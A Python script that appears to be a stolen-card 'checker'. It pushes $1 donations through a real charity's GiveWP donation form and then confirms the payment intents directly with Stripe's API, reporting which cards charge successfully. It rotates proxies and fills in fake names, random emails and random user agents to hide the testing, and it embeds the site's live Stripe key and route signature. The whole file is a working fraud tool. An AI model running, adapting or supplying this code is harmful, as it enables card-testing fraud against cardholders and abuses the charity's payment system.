import requests
import random
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

fake = Faker()

def generate_random_email():
    first = ["ahmed", "mohamed", "ali", "omar", "youssef", "khaled", "abdullah", "fatma", "sara", "nour", "lina", "maya", "hala", "reem", "salma", "amr", "tarek", "hassan", "ibrahim", "karim"]
    last = ["hassan", "ahmed", "mohamed", "ali", "ibrahim", "khalil", "said", "ramadan", "elmasry", "abdallah", "fathy", "tarek", "mostafa", "adel", "gamal"]
    dom = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "aol.com", "mail.com"]
    
    f = random.choice(first)
    l = random.choice(last)
    n = random.randint(10, 9999)
    
    patterns = [
        f"{f}.{l}{n}",
        f"{f}{l}{n}",
        f"{f}_{l}{n}",
        f"{f}{n}",
        f"{l}.{f}{n}",
        f"{f}{l}.{n}",
        f"{f}.{l}.{n}",
        f"{f}{random.randint(1980, 2005)}"
    ]
    
    return f"{random.choice(patterns)}@{random.choice(dom)}".lower()

def _run_stripe_charge_sync(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            
    n = fake.name()
    e = generate_random_email()
    u = generate_user_agent()
    
    # 1. Create client secret
    headers1 = {
        'authority': 'dabbaghwelfare.org',
        'accept': 'application/json',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'origin': 'https://dabbaghwelfare.org',
        'referer': 'https://dabbaghwelfare.org/?givewp-route=donation-form-view&form-id=2784&locale=en_US',
        'user-agent': u,
    }
    
    params1 = {
        'givewp-route': 'donate',
        'givewp-route-signature': '91a10e8029bcdbe0c6ccb1e7a9ad3d77',
        'givewp-route-signature-id': 'givewp-donate',
        'givewp-route-signature-expiration': '1780151834',
    }
    
    files1 = {
        'amount': (None, '1'),
        'currency': (None, 'USD'),
        'donationType': (None, 'single'),
        'subscriptionPeriod': (None, 'one-time'),
        'subscriptionFrequency': (None, '1'),
        'subscriptionInstallments': (None, '0'),
        'formId': (None, '2784'),
        'p2pSourceID': (None, '0'),
        'type_of_your_donation': (None, 'Lillah'),
        'gatewayId': (None, 'stripe_payment_element'),
        'feeRecovery': (None, '0'),
        'p2pSourceType': (None, ''),
        'firstName': (None, n),
        'lastName': (None, n),
        'email': (None, e),
        'mobile': (None, '3150383794'),
        'text_field': (None, ''),
        'note__comment_for_admin': (None, ''),
        'email_1': (None, 'false'),
        'telephone': (None, 'false'),
        'sms': (None, 'false'),
        'giftAid[firstName]': (None, ''),
        'giftAid[lastName]': (None, ''),
        'giftAid[address]': (None, ''),
        'giftAid[postcode]': (None, ''),
        'giftAid[country]': (None, 'GB'),
        'giftAid[optIn]': (None, 'false'),
        'donationBirthday': (None, ''),
        'originUrl': (None, 'https://dabbaghwelfare.org/donations/support-dabbagh-welfare-trust-projects/'),
        'isEmbed': (None, 'true'),
        'embedId': (None, '2784'),
        'locale': (None, 'en_US'),
        'gatewayData[stripePaymentMethod]': (None, 'card'),
        'gatewayData[stripePaymentMethodIsCreditCard]': (None, 'true'),
        'gatewayData[formId]': (None, '2784'),
        'gatewayData[stripeKey]': (None, 'pk_live_51HwlvhD4h6LDgGZGqswBiVPPav5M1NN6SaTeRAqxd9cHbRU4lAXzrpuamYrWo2W88hD7jfBh0ZosFAfn6Uhxuieu00Ium1Nss9'),
        'gatewayData[stripeConnectedAccountId]': (None, 'acct_1HwlvhD4h6LDgGZG'),
    }
    
    try:
        resp1 = session.post(
            'https://dabbaghwelfare.org/', 
            params=params1, 
            cookies=session.cookies, 
            headers=headers1, 
            files=files1, 
            timeout=25
        )
        if resp1.status_code != 200:
            if "wp_die" in resp1.text or "wp-die" in resp1.text:
                return False, "WordPress security check failed (wp_die)"
            return False, f"Failed to get client secret: {resp1.text[:100]}"
            
        client_secret = resp1.json().get('data', {}).get('clientSecret')
        if not client_secret:
            return False, "Failed to extract clientSecret from givewp response"
        
        pi_id = client_secret.split('_secret')[0]
    except requests.exceptions.RequestException:
        return False, "Connection error or timeout"
    except Exception as e:
        return False, f"GiveWP donation route error: {str(e)}"
        
    # 2. Confirm Payment Intent
    headers2 = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': u,
    }
    
    year_str = str(ano)
    if len(year_str) == 4:
        exp_year = year_str[2:]
    else:
        exp_year = year_str

    exp_month = str(mes)
    
    data2 = f'payment_method_data[billing_details][name]={n}+{n}&payment_method_data[billing_details][email]={e}&payment_method_data[billing_details][address][country]=FR&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[payment_user_agent]=stripe.js%2Faf71287371%3B+stripe-js-v3%2Faf71287371%3B+payment-element%3B+deferred-intent%3B+autopm&key=pk_live_51HwlvhD4h6LDgGZGqswBiVPPav5M1NN6SaTeRAqxd9cHbRU4lAXzrpuamYrWo2W88hD7jfBh0ZosFAfn6Uhxuieu00Ium1Nss9&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_secret={client_secret}'
    
    try:
        resp2 = session.post(
            f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
            headers=headers2,
            data=data2,
            timeout=20
        )
        resp_data = resp2.json()
        
        if resp2.status_code == 200:
            status = resp_data.get('status')
            if status == 'succeeded':
                return True, "CARD_CHARGED_SUCCESS"
            elif 'last_payment_error' in resp_data:
                err_msg = resp_data['last_payment_error'].get('message', 'Charge failed')
                return False, err_msg
            return False, f"Charge status: {status}"
        else:
            err_msg = resp_data.get('error', {}).get('message', 'Confirm failed')
            return False, err_msg
    except Exception as e:
        return False, f"Stripe confirm charge error: {str(e)}"

async def process_stripe_charge(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_stripe_charge_sync, cc, mes, ano, cvv, proxy_str)
